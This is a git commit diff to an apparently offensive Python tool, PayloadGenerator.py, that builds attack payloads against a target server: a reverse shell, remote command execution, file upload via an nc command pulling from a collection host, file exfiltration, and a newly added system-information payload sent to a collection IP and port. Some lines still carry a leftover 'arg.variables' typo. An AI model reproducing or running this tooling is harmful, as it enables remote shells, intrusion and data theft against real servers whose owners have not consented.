9d8deca6cd1433f1a771d32adca9317754a08bb9
Mitchell Davies <mitchbd98@gmail.com>
2021-02-14 00:44:39 -0600

    Added a final SysInfo Payload generator

--- PayloadGenerator.py
+++ PayloadGenerator.py
@@ -5,11 +5,11 @@ def main():
 
     #Required arguments
     parser.add_argument('-p', type=str, default=None, help='Desired Payload: exfil', dest='payloadChoice', required=True)
-    parser.add_argument('-t', type=str, default=None, help='Target Server', dest='targetServer', required=True)
-    parser.add_argument('-v', type=str, default=None, help='Server Variables', dest='variables', required=True)
-    parser.add_argument('-i', type=str, default="131.151.162.100", help='collection ip address', dest='collectionIP', required=False)
+    parser.add_argument('-t', type=str, default=None, help='Target Server', dest='targetServer', required=False)
+    parser.add_argument('-v', type=str, default=None, help='Server Variables', dest='variables', required=False)
+    parser.add_argument('-i', type=str, default=None, help='collection ip address', dest='collectionIP', required=False)
     parser.add_argument('-r', type=str, default=1234, help='collection port', dest='collectionPort', required=False)
-    parser.add_argument('-u', type=str, default="input", help='File you wish to exfil', dest='uploadFile', required=False)
+    parser.add_argument('-u', type=str, default="input", help='File you wish to upload', dest='uploadFile', required=False)
     parser.add_argument('-f', type=str, default=None, help='File you wish to exfil', dest='exfilFile', required=False)
     parser.add_argument('-a', type=str, default="ubuntux86", help='Target architecture: ubuntux86', dest='targetArch', required=False)
 
@@ -18,7 +18,7 @@ def main():
     #Reverse Shell Payload
     if(args.payloadChoice == "RShell"):
         print("Reverse Shell payload generator.")
-        ReverseShell(args.collectionIP, args.collectionPort, arg.variables, arg.targetServer)
+        ReverseShell(args.collectionIP, args.collectionPort, args.variables, args.targetServer)
 
     #Command Execution Payload
     #Create an upload script to upload a sh file, and then after about a minute you can run the CExe file.
@@ -26,7 +26,8 @@ def main():
         fileName = args.uploadFile
         if(len(args.uploadFile.split('/')[:-1]) > 0):
             fileName = fileName.split('/')[-1]
-        GenCommandExecution(fileName, arg.variables, args.collectionIP, args.collectionPort, arg.targetServer)
+        GenFileUpload(args.uploadFile, fileName, arg.variables, args.collectionIP, args.collectionPort, args.targetServer)
+        GenCommandExecution(fileName, arg.variables, args.collectionIP, args.collectionPort, args.targetServer)
         print("Execute")
 
     #File-upload Payload
@@ -34,7 +35,7 @@ def main():
         fileName = args.uploadFile
         if(len(args.uploadFile.split('/')[:-1]) > 0):
             fileName = fileName.split('/')[-1]
-        GenFileUpload(args.uploadFile, fileName, arg.variables, args.collectionIP, args.collectionPort, arg.targetServer)
+        GenFileUpload(args.uploadFile, fileName, arg.variables, args.collectionIP, args.collectionPort, args.targetServer)
         print("Upload")
 
     #File-download Payload
@@ -45,13 +46,14 @@ def main():
 
     #System Information Retrieval Payload
     if(args.payloadChoice == "SysInfo"):
+        GenSysInfo(args.collectionIP, args.collectionPort)
         return
 
     return
 
 def ReverseShell(collectionIP, collectionPort, variables, targetServer):
-    GenFileUpload("UsefulBash/ReverseShell.sh", "ReverseShell.sh", variables, collectionIP, collectionPort)
-    GenCommandExecution("ReverseShell.sh", variables, collectionIP, collectionPort)
+    GenFileUpload("UsefulBash/ReverseShell.sh", "ReverseShell.sh", variables, collectionIP, collectionPort, targetServer)
+    GenCommandExecution("ReverseShell.sh", variables, collectionIP, collectionPort, targetServer)
     return
 
 def GenCommandExecution(uploadFile, variables, collectionIP, collectionPort, targetServer):
@@ -62,10 +64,10 @@ def GenCommandExecution(uploadFile, variables, collectionIP, collectionPort, tar
     f.close()
     return
 
-def GenFileUpload(uploadFileDirectory, uploadFile, variables, collectionIP, collectionPort, commandFileName="Upload.cmd", targetServer):
+def GenFileUpload(uploadFileDirectory, uploadFile, variables, collectionIP, collectionPort, targetServer, commandFileName="Upload.cmd"):
     uploadcmd = "nc -q 5 {0} {1} > {2}".format(collectionIP, collectionPort, uploadFile).replace(' ', "%%20")
     with open('CMDTemplates/Upload', 'r') as file:
-        UploadPayloadText = file.read().format(collectionPort, uploadFileDirectory, variables, uploadcmd, targetServer uploadFile)
+        UploadPayloadText = file.read().format(collectionPort, uploadFileDirectory, variables, uploadcmd, targetServer, uploadFile)
 
     f = open(commandFileName, "w")
     f.write(UploadPayloadText)
@@ -77,6 +79,15 @@ def GenExfil(exfilFile, collectionIP, collectionPort):
         ExfilPayloadText = file.read().format(exfilFile, collectionIP, collectionPort)
 
     f = open("Exfil", "w", newline='')
+    f.write(ExfilPayloadText)
+    f.close()
+    return
+
+def GenSysInfo(collectionIP, collectionPort):
+    with open('CMDTemplates/SysInfo', 'r') as file:
+        ExfilPayloadText = file.read().format(collectionIP, collectionPort)
+
+    f = open("SysInfo", "w", newline='')
     f.write(ExfilPayloadText)
     f.close()
     return
